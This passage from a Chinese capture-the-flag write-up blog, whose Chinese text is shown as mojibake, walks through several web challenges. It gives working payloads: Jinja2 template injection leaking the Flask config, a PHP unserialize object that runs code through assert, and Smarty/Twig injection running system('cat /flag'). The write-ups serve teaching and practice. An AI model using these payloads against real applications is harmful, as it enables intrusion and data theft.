¼ï¼Œå‘ç°è¾“å…¥10çš„æ—¶å€™æœ‰æç¤º<br><img src="/images/SJJVW90CRI7BP0MK.png"><br>åªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦<br>ä¸€ä¸ªå­—ç¬¦èƒ½å¤Ÿè´­ä¹°çš„å°±åªæœ‰å‰ä¸‰åªç‹¬è§’å…½ï¼Œä½†æ˜¯éƒ½æ²¡æœ‰è´­ä¹°æˆåŠŸï¼Œæƒ³å¿…çªç ´ç‚¹åœ¨ç¬¬å››åªç‹¬è§’å…½ä¸Šï¼Œå…ˆæ‰¾åˆ°ä¸€ä¸ªæ¯”1337å¤§çš„æ•°<br>å½“ä»€ä¹ˆéƒ½ä¸è¾“å…¥ç›´æ¥è´­ä¹°æ—¶ä¼šå‡ºç°ä»¥ä¸‹æç¤º<br><img src="/images/435G6RU5DA6HCN26.png"><br>çœ‹ä¸€ä¸‹ unicodedata.numericè¿™ä¸ªå‡½æ•°ï¼Œä»–çš„å‚æ•°æ˜¯price<br>å‰ç«¯htmlä½¿ç”¨çš„æ˜¯utf-8ï¼Œåç«¯pythonå¤„ç†ä½¿ç”¨çš„æ˜¯unicodeï¼Œç¼–ç ä¸ä¸€è‡´é€ æˆäº†è½¬ç é—®é¢˜<br><img src="/images/LQ1B771Y202IYPQOL.png"><br><img src="/images/D585S3GQB0CTVOHB9L.png"><br>ä¼ å…¥ä¸‡è¯•è¯•<br><img src="/images/IZ87OSEJ633X4O7QBBE.png"><br>flagæˆåŠŸå›æ˜¾<br>å¦‚æœä¸æƒ³ç”¨ä¸‡çš„è¯å¯ä»¥å»æ‰¾ä¸€ä¸ªUnicodeç¼–ç ç½‘ç«™<br><a href="https://www.compart.com/en/unicode">ä¼ é€é—¨</a><br>ä¾‹å¦‚è¾“å…¥ten thousand<br><img src="/images/NMW9LJLO5NYALOX.png"><br><img src="/images/RT4UKBT5P80RZT5.png"><br>æ‰¾åˆ°ä¸€ä¸ªNumeric Valueå¤§äºç­‰äº10000çš„æ•°å€¼<br>ç›´æ¥å¤åˆ¶ä¸Šé¢çš„ç‰¹æ®Šç¬¦å·æˆ–è€…ä¸‹é¢çš„UTF-8 Encoding<br>æ‰¾åˆ°UTF-8 Encodingï¼š0xE1 0x8D 0xBC<br>å°†0xæ›¿æ¢æˆ%<br><img src="/images/LLNDIZB7VBGLF9K12S.png"><br>è´­ä¹°å¾—åˆ°flag</p><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> os<br><br>app = flask.Flask(__name__)<span class="hljs-comment">#åˆ›å»ºFlaskåº”ç”¨å®ä¾‹ã€åˆå§‹åŒ–Flaskåº”ç”¨</span><br><br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<span class="hljs-comment">#ä»ç¯å¢ƒå˜é‡ä¸­è·å–åä¸º&#x27;FLAG&#x27;çš„å€¼ï¼Œç„¶åå°†å…¶å­˜å‚¨åœ¨Flaskåº”ç”¨çš„é…ç½®ä¸­</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><span class="hljs-comment">#å®šä¹‰æ ¹è·¯ç”±&#x27;/&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<span class="hljs-comment">#è¿”å›å½“å‰æ–‡ä»¶çš„å†…å®¹</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span><span class="hljs-comment">#å®šä¹‰è·¯ç”± /shrine/&lt;path:shrine&gt;ï¼Œä½¿ç”¨ Jinja2 æ¨¡æ¿æ¸²æŸ“è·¯å¾„å‚æ•°ï¼š</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shrine</span>(<span class="hljs-params">shrine</span>):<span class="hljs-comment">#å½“è®¿é—® /shrine/&lt;path:shrine&gt; è·¯å¾„æ—¶ï¼Œä¼šè°ƒç”¨ shrine å‡½æ•°</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_jinja</span>(<span class="hljs-params">s</span>):<br>        s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) + s<br><br>    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>é¦–å…ˆåœ¨shrineè·¯å¾„ä¸‹æµ‹è¯•sstièƒ½å¦æ­£å¸¸æ‰§è¡Œ</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">2</span>*<span class="hljs-number">6</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/LK7HQZB5I2M18ONT.png"></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">safe_jinja</span>(s):<br>       s = s.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>       blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br>       return <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) for c in blacklist]) + s<br><br>   return flask.<span class="hljs-built_in">render_template_string</span>(<span class="hljs-built_in">safe_jinja</span>(shrine))<br></code></pre></td></tr></table></figure><p>å†æ¥åˆ†æè¿™æ®µä»£ç <br>è¿™æ®µä»£ç ä½¿ç”¨äº†ä¸€ä¸ªé»‘åå•blacklist,å…¶ä¸­åŒ…å«äº†è¦åœ¨ä¼ å…¥çš„å­—ç¬¦ä¸²sä¸­è¢«æ›¿æ¢çš„ä¸€äº›å­—ç¬¦ä¸²(åœ¨è¿™é‡Œconfigå’Œself)ã€‚å¯¹äºæ¯ä¸ªé»‘åå•çš„å­—ç¬¦ä¸²cï¼Œå®ƒéƒ½ä¼šç”Ÿæˆä¸€ä¸ªjinja2æ¨¡æ¿è¯­æ³•çš„å­—ç¬¦ä¸²<code>&#123;&#123;% set c=None %&#125;&#125;</code>ï¼Œç„¶åå°†è¿™äº›å­—ç¬¦ä¸²è¿æ¥åˆ°åŸå§‹çš„å­—ç¬¦ä¸²sä¹‹å<br>pythonè¿˜æœ‰ä¸€äº›å†…ç½®å‡½æ•°æ¯”å¦‚url_forå’Œget_flashed_messages<br>payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/shrine/</span>&#123;&#123;url_for.__globals__&#125;&#125;<span class="hljs-regexp">//</span>è¿”å›è§†å›¾å‡½æ•°çš„urlï¼Œå¯¹å¯¹è±¡çš„å…¨å±€å‘½åç©ºé—´çš„è®¿é—®<br></code></pre></td></tr></table></figure><p><img src="/images/PT26X6LGOGY57QTEN2.png"><br>payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>current_app å…è®¸ä½ è·å–å½“å‰åº”ç”¨çš„ä¸€äº›å±æ€§å’Œé…ç½®ä¿¡æ¯<br><span class="hljs-regexp">/shrine/</span>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;<br>-&gt;è·å–flag<br></code></pre></td></tr></table></figure><p><strong>configä¸æ˜¯è¢«åˆ—ä¸ºé»‘åå•äº†å˜›ï¼Ÿï¼Ÿï¼Ÿ</strong><br>å‡è®¾shrineä¸º<code>/shrine/&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code><br>ç„¶åä¼ é€’ç»™safe_jinjaå‡½æ•°ï¼Œåœ¨è¿™ä¸ªæƒ…å†µä¸‹ï¼ŒblackliståŒ…å«äº†config,æ‰€ä»¥ç”Ÿæˆçš„jinja2æ¨¡æ¿å­—ç¬¦ä¸²å¦‚ä¸‹</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;% <span class="hljs-name">set</span> <span class="hljs-attr">config</span>=None %&#125;&#125;</span><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå­—ç¬¦ä¸²ä¸­çš„<code>&#123;&#123;% set config=None %&#125;&#125;</code>éƒ¨åˆ†æ˜¯ä¸ºäº†å°è¯•è®¾ç½®configå˜é‡ä¸ºNone,ä½†ç”±äºJinja2çš„è¯­æ³•ï¼Œè¿™ä¸ªè®¾ç½®æ“ä½œåœ¨å­—ç¬¦ä¸²ä¸­ä»…ä»…æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸ä¼šçœŸæ­£åœ°æ‰§è¡Œã€‚</p><p>å› æ­¤ï¼Œå°½ç®¡çœ‹èµ·æ¥å¥½åƒconfigè¢«è®¾ç½®ä¸ºNone,å®é™…ä¸ŠJinja2åªæ˜¯æŠŠè¿™éƒ¨åˆ†å½“ä½œæ™®é€šçš„æ–‡æœ¬å¯¹å¾…ï¼Œå¹¶æ²¡æœ‰æ‰§è¡Œå®ƒã€‚å› æ­¤ï¼Œåœ¨æ¸²æŸ“æ¨¡æ¿æ—¶ï¼Œconfigçš„å€¼ä»ç„¶æ˜¯<code>url_for.__globals__[&#39;current_app&#39;].config</code>,è€Œæ²¡æœ‰è¢«è®¾ç½®ä¸ºNone<br><img src="/images/XCUV93B45O8I24U3VXW2.png"></p><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>æ£€ç´¢æºä»£ç <br><img src="/images/U30NAQ0SZE9VDQ7O.png"><br>æ‰¾åˆ°ä¸€ä¸ªphpæ–‡ä»¶ï¼Œè¿›å»åº·åº·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&quot;Y-m-d h:i:s&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&quot;date&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>@<span class="hljs-variable">$ppp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br><br></code></pre></td></tr></table></figure><p>æ²¡å•¥å¥½åˆ†æçš„ï¼Œç›´æ¥èµ‹å€¼åºåˆ—åŒ–</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$c</span>-&gt;b=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-variable">$c</span>-&gt;a=<span class="hljs-string">&quot;phpinfo()&quot;</span>;<br>echo serialize(<span class="hljs-variable">$c</span>);<br><span class="hljs-regexp">//</span>O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;HelloPhp&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>åœ¨å¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œ__destructä¼šè¢«è°ƒç”¨<br>ä¹Ÿå°±æ˜¯</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">echo</span> <span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">assert</span></span>(<span class="hljs-string">&quot;phpinfo()&quot;</span>);</span><br></code></pre></td></tr></table></figure><p>assertä¸evalçš„åŠŸèƒ½åŸºæœ¬ç›¸åŒï¼Œä½†ä¸éœ€è¦åé¢åŠ <code>;</code><br>è¿˜æœ‰å‚æ•°sourceä¸èƒ½å‡ºç°ï¼Œä¸ç„¶die(0)ä¼šç›´æ¥ç»“æŸè„šæœ¬<br>payload</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?d</span>ata=<span class="hljs-symbol">O:</span><span class="hljs-number">8</span><span class="hljs-symbol">:<span class="hljs-string">&quot;HelloPhp&quot;</span></span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-symbol">s:</span><span class="hljs-number">1</span><span class="hljs-symbol">:<span class="hljs-string">&quot;a&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">9</span><span class="hljs-symbol">:<span class="hljs-string">&quot;phpinfo()&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">1</span><span class="hljs-symbol">:<span class="hljs-string">&quot;b&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">6</span><span class="hljs-symbol">:<span class="hljs-string">&quot;assert&quot;</span></span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/YCMFTEQZQ5AMTYVRU31.png"><br>è¯¦ç»†â€“&gt;<a href="https://blog.csdn.net/ojingzhiyuan12/article/details/88556074">evalä¸assert</a>&lt;â€“</p><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h2><p><img src="/images/G35F0ZJN35S68IL67.png"><br>æ£€ç´¢é¡µé¢å‘ç°æœ‰ä¸ªæ˜¾ç¤ºipçš„åœ°æ–¹<br>å…ˆåº·åº·èƒ½ä¸èƒ½xffä¼ªé€ ä¸‹ip<br><img src="/images/J3D1FCKLD0WT7OLY5XN.png"><br>è¿™æ—¶çœ‹åˆ°æœ€ä¸‹é¢æ˜¾ç¤º<br>Build With Smarty !<br>Smartyæ˜¯ä¸€ä¸ªPHPçš„æ¨¡æ¿å¼•æ“ï¼Œæä¾›è®©ç¨‹åºé€»è¾‘ä¸é¡µé¢æ˜¾ç¤ºï¼ˆHTML&#x2F;CSSï¼‰ä»£ç åˆ†ç¦»çš„åŠŸèƒ½ã€‚è¯¥æ¡†æ¶å‡ºç°è¿‡SSTIæ¼æ´<br>sstiå…ˆä¸Šä¸€å¼ å›¾<br><img src="/images/61b42a16c2b405e6ab1ada36470713f1.png"><br>æµ‹è¯•<code>a&#123;*comment*&#125;b</code><br><img src="/images/RJAZ6GRSWBE8ZLSC6R.png"><br>æŒ‰ç…§æ­£å¸¸é€»è¾‘ï¼Œåº”è¯¥ç”¨phpè¯­è¨€å»æŸ¥æ‰¾flagã€‚ä¸€èˆ¬æƒ…å†µä¸‹è¾“å…¥{$smarty.version}å°±å¯ä»¥çœ‹åˆ°è¿”å›çš„smartyçš„ç‰ˆæœ¬å·ã€‚è¯¥é¢˜ç›®çš„Smartyç‰ˆæœ¬æ˜¯3.1.30<br><img src="/images/DY839XW0HNZF8LACB1OZG.png"><br>åœ¨Smarty3çš„å®˜æ–¹æ‰‹å†Œé‡Œæœ‰ä»¥ä¸‹æè¿°:<br>Smartyå·²ç»åºŸå¼ƒ{php}æ ‡ç­¾ï¼Œå¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨ã€‚åœ¨Smarty 3.1ï¼Œ{php}ä»…åœ¨SmartyBCä¸­å¯ç”¨ã€‚æ‰€ä»¥åªèƒ½å¦æ‰¾æ–¹æ³•<br><strong>{if}æ ‡ç­¾</strong><br>å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°è¿™æ ·çš„æè¿°ï¼š<br>smartyçš„{if}æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„iféå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª{if}å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„{&#x2F;if}ä¹Ÿå¯ä»¥ä½¿ç”¨{else}å’Œ{elseif}.å…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚||*,or,&amp;&amp;,and,is_array()ï¼Œç­‰ç­‰ã€‚ã€‚ã€‚æ‰€ä»¥ä¹Ÿå¯ä»¥ä½¿ç”¨<code>&#123;if show_source(&quot;/flag&quot;)&#125;&#123;/if&#125;</code>æ¥è·å¾—flag<br><img src="/images/NGOSYM3EL5ZN0KAAQ.png"><br>æˆ–æ˜¯</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;<span class="hljs-keyword">if</span> system(&#x27;cat flag&#x27;)&#125;</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">if</span>&#125;</span><br></code></pre></td></tr></table></figure><p>åœ¨å‰é¢çš„æ¨¡æ¿å›¾ä¸­æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨å¦ä¸€ç§æ–¹æ³•<br>xffä¸­è¾“å…¥</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/images/VYY7B6N5IKE3WV71CVL.png"><br>å†è¾“å…¥</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-string">&#x27;7&#x27;</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>å›æ˜¾ä¸º49<br>ç¡®å®šä¸ºtwigæ¨¡æ¿<br>RCE</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">//css index.php smarty templates_c xff</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls /&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;cat /flag&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>flagåœ¨æºç ä¸­ğŸ‘€</p><h2 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//ä¾‹å­ c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span 